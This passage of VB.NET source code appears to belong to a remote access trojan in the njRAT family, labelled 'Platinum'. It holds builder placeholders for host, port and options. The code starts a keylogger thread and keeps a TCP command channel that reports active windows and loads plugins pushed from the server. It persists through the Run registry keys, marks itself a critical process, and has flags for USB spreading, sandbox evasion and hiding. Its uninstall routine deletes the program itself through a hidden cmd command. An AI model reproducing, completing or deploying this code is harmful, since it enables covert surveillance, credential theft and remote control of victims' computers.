                    OK.F.Registry.CurrentUser.SetValue("di", "!")
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                End Try
                Thread.Sleep(&H1388)
            End If
            Dim createdNew As Boolean = False
            OK.MT = New Mutex(True, OK.RG, createdNew)
            If Not createdNew Then
                ProjectData.EndApp()
            End If
            OK.INS()
            If Not OK.Idr Then
                OK.EXE = OK.LO.Name
                OK.DR = OK.LO.Directory.Name
            End If
            Dim s As New Thread(New ThreadStart(AddressOf OK.RC), 1)
            s.Start()
            Try
                OK.kq = New kl
                Dim m As New Thread(New ThreadStart(AddressOf OK.kq.WRK), 1)
                m.Start()
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception2 As Exception = exception8
                ProjectData.ClearProjectError()
            End Try
            Dim num As Integer = 0
            Dim str As String = ""
            If OK.BD Then
                Try
                    AddHandler SystemEvents.SessionEnding, New SessionEndingEventHandler(AddressOf OK._Lambda__2)
                    OK.pr(1)
                Catch exception9 As Exception
                    ProjectData.SetProjectError(exception9)
                    Dim exception3 As Exception = exception9
                    ProjectData.ClearProjectError()
                End Try
            End If
            Do While True
                Thread.Sleep(&H3E8)
                If Not OK.Cn Then
                    str = ""
                End If
                Application.DoEvents()
                Try
                    num += 1
                    If (num = 5) Then
                        Try
                            Process.GetCurrentProcess.MinWorkingSet = (&H400)
                        Catch exception10 As Exception
                            ProjectData.SetProjectError(exception10)
                            Dim exception4 As Exception = exception10
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    If (num >= 8) Then
                        num = 0
                        Dim str2 As String = OK.ACT
                        If (str <> str2) Then
                            str = str2
                            OK.Send(("act" & OK.Y & str2))
                        End If
                    End If
                    If OK.Isu Then
                        Try
                            If Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.CurrentUser.GetValue((OK.sf & "\" & OK.RG), ""), ("""" & OK.LO.FullName & """ .."), False) Then
                                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                            End If
                        Catch exception11 As Exception
                            ProjectData.SetProjectError(exception11)
                            Dim exception5 As Exception = exception11
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            If Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.LocalMachine.GetValue((OK.sf & "\" & OK.RG), ""), ("""" & OK.LO.FullName & """ .."), False) Then
                                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                            End If
                        Catch exception12 As Exception
                            ProjectData.SetProjectError(exception12)
                            Dim exception6 As Exception = exception12
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                Catch exception13 As Exception
                    ProjectData.SetProjectError(exception13)
                    Dim exception7 As Exception = exception13
                    ProjectData.ClearProjectError()
                End Try
            Loop
        End Sub

        Public Shared Function md5(ByVal B As Byte()) As String
            B = New MD5CryptoServiceProvider().ComputeHash(B)
            Dim str2 As String = ""
            Dim num As Byte
            For Each num In B
                str2 = (str2 & num.ToString("x2"))
            Next
            Return str2
        End Function

        <DllImport("ntdll")>
        Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
        End Function

        Public Shared Function Plugin(ByVal b As Byte(), ByVal c As String) As Object
            Dim [Module] As [Module]
            For Each [Module] In Assembly.Load(b).GetModules
                Dim type As Type
                For Each type In [Module].GetTypes
                    If type.FullName.EndsWith(("." & c)) Then
                        Return [Module].Assembly.CreateInstance(type.FullName)
                    End If
                Next
            Next
            Return Nothing
        End Function

        Public Shared Sub pr(ByVal i As Integer)
            Try
                OK.NtSetInformationProcess(Process.GetCurrentProcess.Handle, &H1D, i, 4)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Sub RC()
Label_0000:
            OK.lastcap = ""
            If (Not OK.C Is Nothing) Then
                Dim num As Long = -1
                Dim num2 As Integer = 0
                Try
Label_001B:
                    num2 += 1
                    If (num2 = 10) Then
                        num2 = 0
                        Thread.Sleep(1)
                    End If
                    If Not OK.Cn Then
                        GoTo Label_01C1
                    End If
                    If (OK.C.Available < 1) Then
                        OK.C.Client.Poll(-1, SelectMode.SelectRead)
                    End If
Label_0057:
                    If (OK.C.Available > 0) Then
                        If (num = -1) Then
                            Dim str As String = ""
                            Do While True
                                Dim charCode As Integer = OK.C.GetStream.ReadByte
                                Select Case charCode
                                    Case -1
                                        GoTo Label_01C1
                                    Case 0
                                        num = Conversions.ToLong(str)
                                        str = ""
                                        If (num = 0) Then
                                            OK.Send("")
                                            num = -1
                                        End If
                                        If (OK.C.Available <= 0) Then
                                            GoTo Label_001B
                                        End If
                                        GoTo Label_0057
                                End Select
                                str = (str & Conversions.ToString(Conversions.ToInteger(Strings.ChrW(charCode).ToString)))
                            Loop
                        End If
                        OK.b = New Byte((OK.C.Available + 1) - 1) {}
                        Dim num5 As Long = (num - OK.MeM.Length)
                        If (OK.b.Length > num5) Then
                            OK.b = New Byte((CInt((num5 - 1)) + 1) - 1) {}
                        End If
                        Dim count As Integer = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None)
                        OK.MeM.Write(OK.b, 0, count)
                        If (OK.MeM.Length = num) Then
                            num = -1
                            Dim thread As New Thread(New ParameterizedThreadStart(AddressOf OK._Lambda__1), 1)
                            thread.Start(OK.MeM.ToArray)
                            thread.Join(100)
                            OK.MeM.Dispose()
                            OK.MeM = New MemoryStream
                        End If
                        GoTo Label_001B
                    End If
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                End Try
            End If
Label_01C1:
            Try
                If (Not OK.PLG Is Nothing) Then
                    NewLateBinding.LateCall(OK.PLG, Nothing, "clear", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                    OK.PLG = Nothing
                End If
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                ProjectData.ClearProjectError()
            End Try
            OK.Cn = False
            If Not OK.connect Then
                GoTo Label_01C1
            End If
            OK.Cn = True
            GoTo Label_0000
        End Sub

        Public Shared Function SB(ByRef S As String) As Byte()
            Return Encoding.UTF8.GetBytes(S)
        End Function

        Public Shared Function Send(ByVal S As String) As Boolean
            Return OK.Sendb(OK.SB(S))
        End Function

        Public Shared Function Sendb(ByVal b As Byte()) As Boolean
            If Not OK.Cn Then
                Return False
            End If
            Try
                Dim lO As FileInfo = OK.LO
                SyncLock lO
                    If Not OK.Cn Then
                        Return False
                    End If
                    Dim stream As New MemoryStream
                    Dim length As Integer = b.Length
                    Dim buffer As Byte() = OK.SB((length.ToString & ChrW(0)))
                    stream.Write(buffer, 0, buffer.Length)
                    stream.Write(b, 0, b.Length)
                    OK.C.Client.Send(stream.ToArray, 0, CInt(stream.Length), SocketFlags.None)
                End SyncLock
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Try
                    If OK.Cn Then
                        OK.Cn = False
                        OK.C.Close()
                    End If
                Catch exception3 As Exception
                    ProjectData.SetProjectError(exception3)
                    Dim exception2 As Exception = exception3
                    ProjectData.ClearProjectError()
                End Try
                ProjectData.ClearProjectError()
            End Try
            Return OK.Cn
        End Function

        Public Shared Function STV(ByVal n As String, ByVal t As Object, ByVal typ As RegistryValueKind) As Boolean
            Dim flag As Boolean
            Try
                OK.F.Registry.CurrentUser.CreateSubKey(("Software\" & OK.RG)).SetValue(n, RuntimeHelpers.GetObjectValue(t), typ)
                flag = True
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                flag = False
                ProjectData.ClearProjectError()
            End Try
            Return flag
        End Function

        Public Shared Sub UNS()

            Dim drivers As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
            Dim driver() As String = (IO.Directory.GetLogicalDrives)
            For Each drivers In driver
                Try
                    If System.IO.File.Exists(drivers & OK.RG) = True Then
                        System.IO.File.Delete(drivers & OK.RG)
                    End If
                Catch
                End Try
            Next



            OK.pr(0)
            OK.Isu = False
            Try
                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Try
                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception2 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try

            Try
                If OK.HIDE_ME = True Then
                    File.SetAttributes((Interaction.Environ(OK.DR) & "\" & OK.EXE), FileAttributes.Normal)
                Else
                End If
                'If (Not OK.FS Is Nothing) Then
                'OK.FS.Dispose()
                Dim newRG As String = System.IO.Path.GetFileNameWithoutExtension(Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG)
                File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & newRG & ".url"))
                File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG))
                ' End If
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception4 As Exception = exception9
                ProjectData.ClearProjectError()
            End Try
            Try
                OK.F.Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(OK.RG, False)
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception5 As Exception = exception10
                ProjectData.ClearProjectError()
            End Try
            Try
                Interaction.Shell(("cmd.exe /c ping 0 -n 2 & del """ & OK.LO.FullName & """"), AppWinStyle.Hide, False, -1)
            Catch exception11 As Exception
                ProjectData.SetProjectError(exception11)
                Dim exception6 As Exception = exception11
                ProjectData.ClearProjectError()
            End Try
            ProjectData.EndApp()
        End Sub

        Public Shared Function ZIP(ByVal B As Byte()) As Byte()
            Dim stream2 As New MemoryStream(B)
            Dim stream As New GZipStream(stream2, CompressionMode.Decompress)
            Dim buffer2 As Byte() = New Byte(4 - 1) {}
            stream2.Position = (stream2.Length - 5)
            stream2.Read(buffer2, 0, 4)
            Dim count As Integer = BitConverter.ToInt32(buffer2, 0)
            stream2.Position = 0
            Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
            stream.Read(array, 0, count)
            stream.Dispose()
            stream2.Dispose()
            Return array
        End Function


        ' Fields
        Public Shared PasteE As Boolean = Conversions.ToBoolean("[PasteE]")
        Public Shared PASTEBIN As String = "[PASTEBIN]"
        Public Shared Sched As Boolean = Conversions.ToBoolean("[Sched]")
        Public Shared SCHEDNAME As String = "[SCHEDNAME]"
        Public Shared ANYRUN As Boolean = Conversions.ToBoolean("[ANYRUN]")
        Public Shared Bypass As String = "[Bypass]"
        Public Shared TaskMGR As Boolean = Conversions.ToBoolean("[TaskMGR]")
        Public Shared KProc As Boolean = Conversions.ToBoolean("[KProc]")
        Public Shared Proc As String = "[Proc]"
        Public Shared SLP As String = "[SLP]"
        Private Shared b As Byte() = New Byte(&H1401 - 1) {}
        Public Shared BD As Boolean = Conversions.ToBoolean("[BD]")
        Public Shared C As TcpClient = Nothing
        Public Shared Cn As Boolean = False
        Public Shared DR As String = "[DR]"
        Public Shared EXE As String = "[EXE]"
        Public Shared F As Computer = New Computer
        Public Shared FS As FileStream
        Public Shared H As String = "[H]"
        Public Shared Idr As Boolean = Conversions.ToBoolean("[Idr]")
        Public Shared Anti_CH As Boolean = Conversions.ToBoolean("[Anti_CH]")
        Public Shared IsF As Boolean = Conversions.ToBoolean("[Isf]")
        Public Shared USB_SP As Boolean = Conversions.ToBoolean("[USB_SP]")
        Public Shared Isu As Boolean = Conversions.ToBoolean("[Isu]")
        Public Shared kq As kl = Nothing
        Private Shared lastcap As String = ""
        Public Shared LO As FileInfo = New FileInfo(Assembly.GetEntryAssembly.Location)
        Private Shared MeM As MemoryStream = New MemoryStream
        Public Shared MT As Object = Nothing
        Public Shared P As String = "[P]"
        Public Shared PLG As Object = Nothing
        Public Shared RG As String = "[EXE]"
        Public Shared sf As String = "Software\Microsoft\Windows\CurrentVersion\Run"
        Public Shared VN As String = "[VN]"
        Public Shared VR As String = "Platinum"
        Public Shared Y As String = "[Y]"
        Public Shared BOT_KILL As Boolean = Conversions.ToBoolean("[BOTKILL]")
        Public Shared HIDE_ME As Boolean = Conversions.ToBoolean("[HIDE_ME]")
        Public Shared Persis As Boolean = Conversions.ToBoolean("[Persis]")

    End Class














End Namespace
